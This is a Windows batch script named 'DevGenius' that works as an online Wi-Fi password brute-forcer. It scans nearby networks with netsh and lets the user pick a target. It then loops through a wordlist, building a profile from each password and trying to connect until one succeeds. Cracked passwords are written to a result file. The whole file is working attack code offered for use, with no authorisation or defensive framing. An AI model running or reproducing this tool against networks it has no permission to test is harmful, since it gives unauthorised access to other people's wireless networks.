@echo off
cls
setlocal enabledelayedexpansion
title DevGenius
color 0f

cd /D %~dp0

if not exist Source_Code\importwifi.xml (
    call :exit_fatal "Source_Code\importwifi.xml is missing. Exiting..."
)

set interface_number=0
set interface_mac=not_defined
set interface_id=not_defined
set interface_state=not_defined
set interface_description=not_defined
set wifi_target=not_defined
set attack_counter_option=0

set wordlist_file=not_defined
if exist Source_Code\passwords\password.txt (
    set wordlist_file=Source_Code\passwords\password.txt
) else if exist Source_Code\passwords\wordlist.txt (
    set wordlist_file=Source_Code\passwords\wordlist.txt
)


:program_entry
    call :interface_init
    call :mainmenu
goto :eof

:interface_detection
    cls
    echo.
    call :color_echo . yellow "Detecting interfaces..."
    set interface_temp_index=-1
    set interface_number=0

    for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L "Name Description Physical"') do (
        if "%%c"=="Wi-Fi" (
            set /a interface_temp_index+=1
            if "%%d"=="" (
                set interface[!interface_temp_index!]_id=%%c
            ) else (
                set interface[!interface_temp_index!]_id=%%c %%d
            )
        )
        if %%a==Description (
            set interface[!interface_temp_index!]_description=%%c %%d
        )
        if %%a==Physical (
            set interface[!interface_temp_index!]_mac=%%d
        )
    )

    set /a interface_number=!interface_temp_index!+1
    timeout /t 0 >nul
    cls
goto :eof



:color_echo
    :: Check if the first two arguments are empty, as they are required for background and foreground color information
    if "%~1" equ "" goto :eof
    if "%~2" equ "" goto :eof

    :: Set background color if valid
    set "bg_color="
    if "%~1" equ "black" set "bg_color=40m"
    if "%~1" equ "red" set "bg_color=41m"
    if "%~1" equ "green" set "bg_color=42m"
    if "%~1" equ "yellow" set "bg_color=43m"
    if "%~1" equ "blue" set "bg_color=44m"
    if "%~1" equ "magenta" set "bg_color=45m"
    if "%~1" equ "cyan" set "bg_color=46m"
    if "%~1" equ "white" set "bg_color=47m"

    if defined bg_color <nul set /p=[%bg_color%

    :: Set foreground color if valid
    set "fg_color="
    if "%~2" equ "black" set "fg_color=30m"
    if "%~2" equ "red" set "fg_color=31m"
    if "%~2" equ "green" set "fg_color=32m"
    if "%~2" equ "yellow" set "fg_color=33m"
    if "%~2" equ "blue" set "fg_color=34m"
    if "%~2" equ "magenta" set "fg_color=35m"
    if "%~2" equ "cyan" set "fg_color=36m"
    if "%~2" equ "white" set "fg_color=37m"

    if defined fg_color <nul set /p=[%fg_color%

    :: Print the text
    <nul set /p="%~3"

    :: Reset the color settings
    <nul set /p=[0m
goto :eof





:interface_init
    cls
    call :interface_detection
    echo.
    call :color_echo . cyan " Interface Init"
    echo.
    echo.

    if !interface_number! equ 1 (
        call :color_echo . yellow " Only '1' Interface Found!"
        echo.
        call :color_echo . white " !interface[0]_description! ("
        call :color_echo . blue "!interface[0]_mac!"
        call :color_echo . white ")"
        echo.
        echo Making !interface[0]_description! the default interface...
        set interface_id=!interface[0]_id!
        set interface_description=!interface[0]_description!
        set interface_mac=!interface[0]_mac!
        timeout /t 0 >nul
    )

    if !interface_number! gtr 1 (
        call :color_echo . yellow " Multiple '!interface_number!' Interfaces Found!"
        echo.
        timeout /t 0 >nul
        call :interface_selection
    )

    if !interface_number! equ 0 (
        call :color_echo . yellow "WARNING"
        echo.
        echo No interfaces found on this device!
        echo.
        set interface_id=not_defined
        set interface_description=not_defined
        set interface_mac=not_defined
        pause
        cls
    )

goto :eof




:interface_selection
    cls
    echo.
    call :color_echo . cyan "Interface Selection"
    echo.
    set wifi_target=not_defined
    set /a interface_number_zero_indexed=!interface_number!-1
    set /a cancel_index=!interface_number_zero_indexed!+1

    for /l %%a in ( 0, 1, !interface_number_zero_indexed! ) do (
        call :color_echo . magenta "%%a) "
        call :color_echo . white " !interface[%%a]_description! ("
        call :color_echo . blue "!interface[%%a]_mac!"
        call :color_echo . white ")"
        echo.
    )
    
    call :color_echo
    call :color_echo . red "!cancel_index!) Cancel"
    echo.
    call :program_prompt

    if "!program_prompt_input!" equ "" (
        call :program_prompt_invalid_input
        goto :interface_selection
    )

    if !program_prompt_input! leq !interface_number_zero_indexed! (
        if !program_prompt_input! geq 0 (
            echo.
            echo Making !interface[%program_prompt_input%]_description! the interface...
            set interface_id=!interface[%program_prompt_input%]_id!
            set interface_description=!interface[%program_prompt_input%]_description!
            set interface_mac=!interface[%program_prompt_input%]_mac!
            timeout /t 0 >nul
        ) else if "!program_prompt_input!" equ "!cancel_index!" (
            set interface_id=not_defined
            set interface_description=not_defined
            set interface_mac=not_defined
            goto :eof
        ) else (
            call :program_prompt_invalid_input
            goto :interface_selection
        )
    ) else if "!program_prompt_input!" equ "!cancel_index!" (
        set interface_id=not_defined
        set interface_description=not_defined
        set interface_mac=not_defined
        goto :eof
    ) else (
        call :program_prompt_invalid_input
        goto :interface_selection
    )

goto :eof

:program_prompt
    call :color_echo . green " bruteforcer"
    call :color_echo . white "$ "
    set /p program_prompt_input=
goto :eof



:program_prompt_invalid_input
    call :color_echo . red "Invalid input"
    timeout /t 0 >nul
goto :eof

:mainmenu
    cls
    echo.
    call :color_echo . cyan "                                             "
    echo.
    call :color_echo . cyan " )\ )            (                           "
    echo.
    call :color_echo . cyan "(()/(    (   )   )\ )     (      (    (      "
    echo.
    call :color_echo . cyan " /(_))  ))\ /(( (()/(    ))\ (   )\  ))\ (   "
    echo.
    call :color_echo . cyan "(_))_  /((_(_))\ /(_))_ /((_))\ ((_)/((_))\  "
    echo.
    call :color_echo . cyan " |   \(_)) _)((_(_)) __(_)) _(_/((_(_))(((_) "
    echo.
    call :color_echo . cyan " | |) / -_)\ V /  | (_ / -_| ' \)| | || (_-< "
    echo.
    call :color_echo . cyan " |___/\___| \_/    \___\___|_||_||_|\_,_/__/ "
    echo.

    call :color_echo . cyan "DevGenius"
    echo.
    call :color_echo . magenta "   Interface : "
    call :color_echo . white "!interface_description!("
    call :color_echo . blue "!interface_mac! "
    call :color_echo . white ")"
    echo.
    
    if "!wifi_target!" == "not_defined" (
        call :color_echo . magenta "   Target    : "
        call :color_echo . red "no target, type 'scan' to scan networks"
    ) else (
        call :color_echo . magenta "   Target    : "
        call :color_echo . white "!wifi_target!"
    )
    
    echo.
    call :color_echo . magenta "   Wordlist  : "
    call :color_echo . white "!wordlist_file!"
    echo.

    if "!wifi_target!" neq "not_defined" (
        echo Type 'attack' to attack the selected network.
        echo Type 'scan' to scan new Wi-Fi networks.
        echo Type 'help' for more information.
    ) else (
        echo Type 'scan' to scan Wi-Fi networks.
        echo Type 'help' for more information.
    )
    echo Type 'exit' to close the program.
    echo.
    
    call :program_prompt

    if "!program_prompt_input!" equ "scan" (
        call :scan
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "interface" (
        call :interface_init
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "attack" (
        call :attack
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "help" (
        call :help
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "wordlist" (
        call :wordlist
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "counter" (
        call :counter
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "exit" (
        exit
    )

    call :program_prompt_invalid_input
    
goto :mainmenu





:scan
    cls
    netsh wlan disconnect interface="%interface_id%" > nul

    if "!interface_id!" equ "not_defined" (
        call :color_echo . red "You have to select an interface to perform a scan"
        set wifi_target=not_defined
        echo.
        echo.
        pause
        goto :eof
    )

    echo.
    call :color_echo . cyan "Possible Wi-Fi Networks"
    echo.
    echo.

    set wifi_index=-1
    set cancel_index=0

    for /f "tokens=1-3,*" %%a in ('netsh wlan show networks mode^=bssid interface^="!interface_id!" ') do (
        if "%%a" equ "SSID" (
            set /a wifi_index+=1
            set wifi[!wifi_index!]_ssid=%%d
        )
        if "%%a" equ "Signal" (
            set wifi[!wifi_index!]_signal=%%c
        )
    )

    set /a cancel_index=!wifi_index!+1

    for /l %%a in ( 0, 1, !wifi_index! ) do (
        call :color_echo . magenta "%%a) "
        if "!wifi[%%a]_ssid!" equ "" (
            call :color_echo . red "No Name "
        ) else (
            call :color_echo . white "!wifi[%%a]_ssid!"
        )
        call :color_echo . blue "!wifi[%%a]_signal!"
        echo.
    )

    call :color_echo . red "!cancel_index!) Cancel"
    echo.
    echo.
    echo Type the [number] of the network you want to attack
    call :program_prompt
    echo.

    if "!program_prompt_input!" equ "!cancel_index!" (
        goto :eof
    )

    if !program_prompt_input! leq !wifi_index! (
        if !program_prompt_input! geq 0 (
            set "wifi_target=!wifi[%program_prompt_input%]_ssid!"
            goto :eof
        )
    )

    call :program_prompt_invalid_input
goto :eof



:attack

    set attack_finalize=false
    if "!wordlist_file!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please provide a wordlist..."
        echo.
        echo.
        pause
        goto :eof
    )


    if "!wifi_target!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please select a target after scanning..."
        echo.
        echo.
        pause
        goto :eof
    )

    if "!interface_id!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please select an interface..."
        echo.
        echo.
        pause
        goto :eof
    )

    cls
    echo.
    call :color_echo . yellow "WARNING"
    echo.
    echo.
    echo If you connected to a network with the same name as this: "!wifi_target!",
    echo its profile will be deleted.
    echo.
    echo This app might not find the correct password if the signal strength
    echo is too low. Remember, this is an online attack. Expect slow attempts.
    echo.
    echo When an association or an authentication is detected, attack counter
    echo is automatically increased by 5 to ensure successful connection.
    echo.
    pause
    netsh wlan delete profile "!wifi_target!" interface="!interface_id!">nul
    cls

    :: Prepare ssid import
    del /Q /F Source_Code\importwifi_prepared.xml 2>nul
    for /f "tokens=*" %%a in ( Source_Code\importwifi.xml ) do (
        set variable=%%a
        echo !variable:changethistitle=%wifi_target%!>>Source_Code\importwifi_prepared.xml
    )

    set password_count=0
    
    for /f "tokens=1" %%a in ( !wordlist_file! ) do (

        set /a password_count=!password_count!+1
        set password=%%a
		set temp_auth_num=0
        call :prepare_attempt "!password!"
        netsh wlan add profile filename=Source_Code\importwifi_attempt.xml >nul
        cls
        echo.
        call :color_echo . cyan "Attacking"
        echo.
        echo.
        call :color_echo . magenta "Target Wi-Fi   : "
        call :color_echo . white "!wifi_target!"
        echo.
        call :color_echo . magenta "Password Count : "
        call :color_echo . white "!password_count!"
        echo.
        echo.
        call :color_echo . blue "Trying password -> "
        call :color_echo . yellow "!password!"
        echo.
        echo.
        call :color_echo . cyan "Attempts: "
        echo.

        call :attack_attempt

        if "!attack_finalize!" equ "true" (
            set attack_finalize=false
            goto :eof
        )

    )

    call :attack_failure
goto :eof


:attack_failure
    del /Q /F Source_Code\importwifi_prepared.xml 2>nul
    del /Q /F Source_Code\importwifi_attempt.xml 2>nul
    cls
    echo.
    call :color_echo . red "Could not find the password"
    echo.
    echo.
    netsh wlan delete profile "!wifi_target!" interface="!interface_id!">nul
    pause
goto :eof

:attack_success
    del /Q /F Source_Code\importwifi_prepared.xml 2>nul
    del /Q /F Source_Code\importwifi_attempt.xml 2>nul
    cls
    echo.
    call :color_echo . green "Found the password"
    echo.
    echo.
    echo.
    call :color_echo . magenta "Target     : "
    call :color_echo . white "!wifi_target!"
    echo.
    call :color_echo . magenta "Password   : "
    call :color_echo . white "!password!"
    echo.
    call :color_echo . magenta "At attempt : "
    call :color_echo . white "!password_count!"
    echo.
    echo.

    echo DevGenius - Wi-Fi Attack Tool Result>>Source_Code\resultPasswords\result.txt
    echo Target     : !wifi_target!>>Source_Code\resultPasswords\result.txt
    echo At attempt : !password_count!>>Source_Code\resultPasswords\result.txt
    echo Password   : !password!>>Source_Code\resultPasswords\result.txt
    echo.>>Source_Code\resultPasswords\result.txt
    pause
goto :eof

:attack_attempt
	netsh wlan connect name="!wifi_target!" interface="!interface_id!" >nul

    if "%attack_counter_option%" equ "0" (
        set attack_counter=10
    ) else (
        set attack_counter=!attack_counter_option!
    )

    set attack_associating_detected=false
    set attack_authenticating_detected=false

    for /l %%a in ( 1, 1, 40 ) do (

        if "!attack_counter!" equ "0" (
            del /Q /F Source_Code\importwifi_attempt.xml 2>nul
            goto :eof
        )

        call :color_echo . white "Attempts Left ("
        call :color_echo . magenta "!attack_counter!"
        call :color_echo . white ") "

        call :interface_find_state

        if "!interface_state!" equ "associating" (
            if "!attack_associating_detected!" equ "false" (
                set /a attack_counter=!attack_counter!+5
                set attack_associating_detected=true
            )
        ) 

        if "!interface_state!" equ "authenticating" (
            if "!attack_authenticating_detected!" equ "false" (
                set /a attack_counter=!attack_counter!+5
                set attack_authenticating_detected=true
            )
        ) 

        if "!interface_state!" equ "connecting" (
            del /Q /F Source_Code\importwifi_attempt.xml 2>nul
            set attack_finalize=true
            call :attack_success
            goto :eof
        )

        if "!interface_state!" equ "connected" (
            del /Q /F Source_Code\importwifi_attempt.xml 2>nul
            set attack_finalize=true
            call :attack_success
            goto :eof
        )
        
        set /a attack_counter=!attack_counter!-1
    )

goto :eof


:help
	cls
	echo.
	call :color_echo . cyan "Commands"
	echo.
	echo.
	echo  - help             : Displays this page
	echo  - wordlist         : Provide a wordlist file
	echo  - scan             : Performs a WI-FI scan
	echo  - interface        : Open Interface Management
	echo  - attack           : Attacks selected WI-FI
	echo  - counter          : Sets the attack counter
	echo  - exit             : Close the program
	echo.
	echo  For more information, please refer to "README.md".
	echo.
	echo  More projects from TechnicalUserX:
	echo  https://github.com/TechnicalUserX
	echo.
	echo.
	echo Press any key to continue...
	pause >nul

goto :eof


:wordlist
    cls
    echo.
    call :color_echo . cyan "Wordlist"
    echo.
    echo.
    echo Please provide a valid wordlist
    echo.
    call :program_prompt
    echo.
    if not exist !program_prompt_input! (
        call :color_echo . red "Provided path does not resolve to a file"
        timeout /t 0 >nul
    ) else (
        set wordlist_file=!program_prompt_input!
        goto :eof
    )
goto :eof

:counter
    cls
    echo.
    call :color_echo . cyan "Set Attempt Count"
    echo.
    echo.
    echo Please provide number for per-password 
    echo counter while attacking a network.
    echo.
    echo This counter will be used to query network
    echo connection whether it is successful.
    echo.
    call :program_prompt
    echo.
    echo %program_prompt_input%| findstr /r "^[0-9]*$" >nul
    
    if %errorlevel% equ 0 (
        set attack_counter_option=!program_prompt_input!
    ) else (
        call :color_echo . red "Provided input is not a valid number"
        timeout /t 0 >nul
    )
goto :eof


:prepare_attempt
	for /f "tokens=*" %%x in ( Source_Code\importwifi_prepared.xml ) do (
		set code=%%x
		echo !code:changethiskey=%~1!>>Source_Code\importwifi_attempt.xml
    )
goto :eof


:interface_find_state
    set interface_state_check=false

        for /f "tokens=1-5" %%a in ('netsh wlan show interfaces ^| findstr /L "Name State"') do ( 
        
        if !interface_state_check!==true (
            set interface_state=%%c
            goto :skip_find_connection_state
        )
        
        if "!interface_id!"=="%%c" (
            set interface_state_check=true
        )
        
        if "!interface_id!"=="%%c %%d" (
            set interface_state_check=true
        )
    )
	:skip_find_connection_state
    if !interface_state!==associating (
        call :color_echo . yellow "Associating"
        echo.
    )
    if !interface_state!==disconnecting (
        call :color_echo . red "Disconnecting..."
        echo.
    )
    if !interface_state!==disconnected (
        call :color_echo . red "Disconnected"
        echo.
    )
    if !interface_state!==authenticating (
        call :color_echo . blue "Authenticating"
        echo.
    )
    if !interface_state!==connecting (
        call :color_echo . yellow "Connecting"
        echo.
    )
    if !interface_state!==connected (
        call :color_echo . green "Connected"
        echo.
        timeout /t 0 /nobreak>nul
    )
goto :eof


:exit_fatal
    call :color_echo . red "%~1"
    timeout /t 0 >nul
    exit
goto :eof
